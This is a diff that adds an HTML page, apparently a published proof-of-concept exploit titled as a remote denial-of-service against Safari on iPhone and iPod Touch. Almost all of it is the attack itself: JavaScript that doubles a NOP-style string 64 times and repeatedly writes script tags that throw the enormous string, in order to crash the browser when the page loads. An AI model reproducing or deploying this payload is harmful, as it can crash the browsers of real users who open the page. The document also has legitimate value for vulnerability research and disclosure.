@@ -1,0 +1,18 @@
+&lt;html&gt;
+&lt;head&gt;
+&lt;title&gt; Bad &quot;throw&quot; exception Remote DoS on Safari for iPhone &amp; iPod Touch &lt;/title&gt;
+&lt;script language=&quot;JavaScript&quot;&gt;
+var n=unescape(&quot;%u9090&quot;);
+var s=unescape(&quot;%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000&quot;);
+for(var i=0;i&lt;64;i++){
+n=n+n;
+document.write(&#039;&lt;script&gt;throw n+s;&lt;/scr&#039;+&#039;ipt&gt;&#039;);
+}
+&lt;/script&gt;
+&lt;/head&gt;
+&lt;body&gt;
+&lt;center&gt;
+&lt;h1&gt;  Bad &quot;throw&quot; exception Remote DoS on Safari for iPhone &amp; iPod Touch &lt;/h1&gt;
+&lt;h2&gt; (C) Nishant Das Patnaik &lt;/h2&gt;
+&lt;/center&gt;&lt;/body&gt;
+&lt;/html&gt;
